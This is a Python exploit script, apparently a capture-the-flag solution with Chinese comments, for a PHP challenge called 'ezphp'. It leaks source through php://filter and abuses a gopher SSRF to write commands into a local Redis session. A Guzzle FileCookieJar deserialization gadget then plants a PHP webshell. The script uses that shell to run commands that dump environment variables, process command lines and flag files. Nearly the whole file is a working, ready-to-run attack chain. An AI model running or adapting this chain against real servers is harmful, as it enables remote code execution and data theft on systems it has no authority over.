#!/usr/bin/env python3
"""ezphp 利用脚本.

链: 源码泄露(php://filter) -> 发现只允许环回地址、协议黑名单漏掉 gopher 的 SSRF
    -> gopher 打本机 Redis, 写入 PHPREDIS_SESSION:<sid>
    -> 值为 pwn|a:2:{i:7;<gadget>i:7;i:7;} (重复整数键让对象在 unserialize 内提前释放)
    -> gadget 用 Guzzle FileCookieJar::__destruct -> save() -> file_put_contents
       写 JSON, 落点 ocs-provider/.cache.php, 代码避开引号与反斜杠
    -> 请求 webshell 执行命令, 再按容器初始化脚本/环境变量定位真实 flag

点: 目标若返回一个格式像 flag 的固定串, 可能是构建期诱饵, 真实 flag 由运行时写入.

用法:
    python exp.py --base http://TARGET
    python exp.py --base http://TARGET --ssrf-path / --ssrf-param url --redis-port 6379
"""

import argparse
import base64
import re
import secrets
import sys
import time

import requests

# JSON 编码会转义引号与反斜杠, 所以 shell 里不放引号: chr(99) == 'c'
SHELL_CODE = "<?php system($_GET[chr(99)]);?>"

SHELL_PATHS = [
    "/var/www/html/ocs-provider/.cache.php",
    "/app/public/ocs-provider/.cache.php",
    "/var/www/nextcloud/ocs-provider/.cache.php",
]
SHELL_URL = "/ocs-provider/.cache.php"

SOURCE_PARAMS = ["file", "source", "src", "page", "view", "code", "filename", "action"]
SSRF_PATHS = ["/", "/index.php", "/fetch.php", "/proxy.php", "/api/fetch", "/ssrf.php"]
SSRF_PARAMS = ["url", "u", "target", "link", "uri", "host"]
TRIGGER_PATHS = ["/", "/index.php", "/login.php", "/login"]


# ---------------- PHP 序列化 ----------------
def php_str(value):
    data = value if isinstance(value, bytes) else value.encode()
    return b's:%d:"' % len(data) + data + b'";'


def php_int(value):
    return b"i:%d;" % value


def php_bool(value):
    return b"b:%d;" % (1 if value else 0)


def php_obj(class_name, props):
    name = class_name.encode()
    body = b"".join(php_str(key) + value for key, value in props)
    return b'O:%d:"%s":%d:{' % (len(name), name, len(props)) + body + b"}"


def php_array(pairs):
    return b"a:%d:{" % len(pairs) + b"".join(php_str(k) + v for k, v in pairs) + b"}"


def build_gadget(filename):
    """Guzzle 7 FileCookieJar: 析构时 save($filename) 把 cookies JSON 写盘."""
    set_cookie = php_obj("GuzzleHttp\\Cookie\\SetCookie", [
        (b"\x00GuzzleHttp\\Cookie\\SetCookie\x00data", php_array([
            ("Expires", php_int(4102444800)),
            ("Discard", php_bool(False)),
            ("Value", php_str(SHELL_CODE)),
            ("Max-Age", php_int(0)),
            ("Domain", php_str("")),
            ("Path", php_str("/")),
            ("Secure", php_bool(False)),
            ("HttpOnly", php_bool(False)),
        ])),
    ])
    jar = php_obj("GuzzleHttp\\Cookie\\FileCookieJar", [
        (b"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename", php_str(filename)),
        (b"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies", php_bool(True)),
        (b"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies", b"a:1:{i:0;" + set_cookie + b"}"),
        (b"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode", php_bool(False)),
    ])
    # 同一个整数键出现两次: 解析第二个 i:7 时第一个值被覆盖并立即释放
    return b"a:2:{i:7;" + jar + b"i:7;i:7;}"


# ---------------- RESP / gopher ----------------
def redis_bulk(data):
    return b"$%d\r\n" % len(data) + data + b"\r\n"


def encode_gopher(host, port, payload):
    encoded = "".join("%%%02x" % byte for byte in payload)
    return "gopher://%s:%d/_%s" % (host, port, encoded)


def session_resp(session_key, session_value, ttl=600):
    commands = (
        b"*3\r\n" + redis_bulk(b"SET") + redis_bulk(session_key) + redis_bulk(session_value)
        + b"*3\r\n" + redis_bulk(b"EXPIRE") + redis_bulk(session_key) + redis_bulk(str(ttl).encode())
    )
    return commands


class Ezphp:
    def __init__(self, base, timeout=20):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.ssrf_path = None
        self.ssrf_param = None
        self.source = ""

    # ---------- 阶段 1: 源码泄露 ----------
    def leak_source(self):
        for param in SOURCE_PARAMS:
            for path in ("/index.php", "/"):
                payload = "php://filter/convert.base64-encode/resource=index"
                try:
                    response = self.session.get(
                        self.base + path, params={param: payload}, timeout=self.timeout
                    )
                except requests.RequestException:
                    continue
                match = re.search(r"[A-Za-z0-9+/=]{80,}", response.text)
                if not match:
                    continue
                try:
                    source = base64.b64decode(match.group(0)).decode("utf-8", "replace")
                except ValueError:
                    continue
                if "<?php" in source:
                    print("[+] 源码泄露: %s %s (%d 字节)" % (path, param, len(source)))
                    self.source = source
                    return source
        print("[!] 未自动泄露源码; 继续用候选参数探测 SSRF")
        return ""

    def guess_ssrf_from_source(self):
        if not self.source:
            return
        names = re.findall(r"\$_(?:GET|POST|REQUEST)\s*\[\s*['\"](\w+)['\"]\s*\]", self.source)
        for name in names:
            if name not in SOURCE_PARAMS:
                print("[i] 源码中的参数名: %s" % name)
                if name not in SSRF_PARAMS:
                    SSRF_PARAMS.insert(0, name)

    # ---------- 阶段 2: 定位 SSRF 与 gopher 可用性 ----------
    def send_ssrf(self, path, param, gopher_url):
        return self.session.get(
            self.base + path + "?%s=%s" % (param, gopher_url), timeout=self.timeout
        )

    def find_ssrf(self, redis_host, redis_port):
        probe = encode_gopher(redis_host, redis_port, b"*1\r\n" + redis_bulk(b"PING"))
        for path in SSRF_PATHS:
            for param in SSRF_PARAMS:
                try:
                    response = self.send_ssrf(path, param, probe)
                except requests.RequestException:
                    continue
                body = response.text
                if "PONG" in body:
                    self.ssrf_path = path
                    self.ssrf_param = param
                    print("[+] SSRF 可用: %s?%s= (gopher -> Redis 已回 PONG)" % (path, param))
                    return True
                if response.status_code == 200 and ("gopher" in body.lower() or "scheme" in body.lower()):
                    print("[i] %s?%s= 有响应但不是 PONG: %s"
                          % (path, param, body[:120].replace("\n", " ")))
        return False

    def ssrf(self, gopher_url):
        if not self.ssrf_path:
            raise RuntimeError("尚未定位 SSRF 入口")
        return self.send_ssrf(self.ssrf_path, self.ssrf_param, gopher_url)

    # ---------- 阶段 3: 投毒 Session 并触发反序列化 ----------
    def poison(self, sid, filename, redis_host, redis_port):
        key = b"PHPREDIS_SESSION:" + sid.encode()
        value = b"pwn|" + build_gadget(filename)
        payload = session_resp(key, value)
        response = self.ssrf(encode_gopher(redis_host, redis_port, payload))
        print("[i] 写 Session (%s) -> %d" % (key.decode(), response.status_code))
        return response

    def trigger(self, sid):
        for path in TRIGGER_PATHS:
            try:
                response = self.session.get(
                    self.base + path,
                    cookies={"PHPSESSID": sid},
                    timeout=self.timeout,
                )
            except requests.RequestException:
                continue
            print("[i] 触发 session_start(): %s -> %d" % (path, response.status_code))
            return response
        return None

    def check_shell(self, command="id"):
        try:
            response = self.session.get(
                self.base + SHELL_URL, params={"c": command}, timeout=self.timeout
            )
        except requests.RequestException:
            return ""
        return response.text


def main():
    parser = argparse.ArgumentParser(description="ezphp SSRF -> Redis session -> Guzzle pop -> webshell")
    parser.add_argument("--base", default="http://TARGET", help="题目入口")
    parser.add_argument("--redis-host", default="127.0.0.1")
    parser.add_argument("--redis-port", type=int, default=6379)
    parser.add_argument("--ssrf-path", default=None, help="已知 SSRF 路径, 例如 /")
    parser.add_argument("--ssrf-param", default=None, help="已知 SSRF 参数名, 例如 url")
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument("--trigger-wait", type=float, default=1.0, help="写 Redis 后等待秒数")
    args = parser.parse_args()

    client = Ezphp(args.base, args.timeout)

    source = client.leak_source()
    if source:
        for keyword in ("parse_url", "gopher", "127.0.0.1", "session", "redis"):
            if keyword in source:
                print("[i] 源码命中关键字: %s" % keyword)
        client.guess_ssrf_from_source()

    if args.ssrf_path and args.ssrf_param:
        client.ssrf_path, client.ssrf_param = args.ssrf_path, args.ssrf_param
        print("[i] 使用指定 SSRF 入口: %s?%s=" % (args.ssrf_path, args.ssrf_param))
    elif not client.find_ssrf(args.redis_host, args.redis_port):
        raise SystemExit("[-] 未能定位 gopher SSRF, 用 --ssrf-path/--ssrf-param 指定")

    sid = secrets.token_hex(16)  # PHP session id 字符集: 字母数字加少量符号
    print("[i] 自定义 SID: %s" % sid)

    for filename in SHELL_PATHS:
        print("[i] 尝试落点: %s" % filename)
        client.poison(sid, filename, args.redis_host, args.redis_port)
        time.sleep(args.trigger_wait)
        client.trigger(sid)
        output = client.check_shell("id")
        if "uid=" in output:
            print("[+] webshell 生效: %s" % filename)
            recon = client.check_shell(
                "id; pwd; ls -la /; cat /proc/1/cmdline; env"
            )
            print("----- recon -----")
            print(recon[:4000])
            print("-----------------")
            for cmd in ("cat /flag* 2>/dev/null; cat /flag.txt 2>/dev/null",
                        "find / -xdev -name 'flag*' -newer /etc/hostname -exec cat {} + 2>/dev/null"):
                print("----- %s -----" % cmd)
                print(client.check_shell(cmd)[:2000])
            return
        print("[!] 该落点未生效")

    raise SystemExit("[-] webshell 未落地: 检查 ocs-provider 目录是否存在/可写, 或换 --base 重试")


if __name__ == "__main__":
    main()
